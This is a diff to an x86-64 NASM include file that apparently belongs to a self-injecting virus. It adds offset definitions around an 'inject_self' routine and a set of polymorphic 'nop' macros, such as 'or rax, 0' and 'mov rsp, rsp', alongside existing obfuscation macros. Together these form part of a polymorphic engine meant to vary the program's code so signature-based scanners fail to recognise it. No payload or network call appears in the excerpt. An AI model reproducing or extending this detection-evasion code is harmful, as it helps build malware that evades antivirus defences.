@@ -56,8 +56,13 @@
 %define SIGNATURE_OFFSET	signature - _start + 44
 %define BEGIN_SIGNATURE_OFFSET_FORM_END _end - signature - 1
 
-%define POLY_OFFSET_1	_start.label_poly1 - _start
-%define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start
+%define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start ; offset of skipped random polymorphic 
+
+%define POLY_NOP_1_OFFSET _start.poly_nop_1 - _start			;offset of poly_nop_1 from _start
+%define POLY_OFFSET_1	_start.label_poly1 - _start				;	
+
+%define POLY_NOP_SIZE 4								;size of polymorphic nops
+%define POLY_NOP_NUMBER 0x000000007			; amount of nops equal instruction possible 
 
 %macro OBF_POLY_1 0
 	OBF_PUSH_RAX
@@ -75,6 +80,26 @@
 	pop rax
 %endmacro
 
+%macro immediate_nop_poly_1 0
+	add r10 , 0
+%endmacro
+
+%macro immediate_nop_poly_2 0
+	or rax, 0
+%endmacro
+
+%macro immediate_nop_poly_3 0
+	and rbx, -1
+%endmacro
+
+%macro immediate_nop_poly_4 0
+	mov rsp, rsp
+%endmacro
+
+%macro immediate_nop_poly_5 0
+	and qword[rsp], -1
+%endmacro
+
 
 %macro POLY_CRAP_SKIPPED 0
 	.poly_crap_skipped:
@@ -87,6 +112,9 @@
 	dd 0xAAAAAAAA
 %endmacro
 ; MACROS
+
+
+
 
 %macro OBF_GENERIC 0
 jmp short 0x2
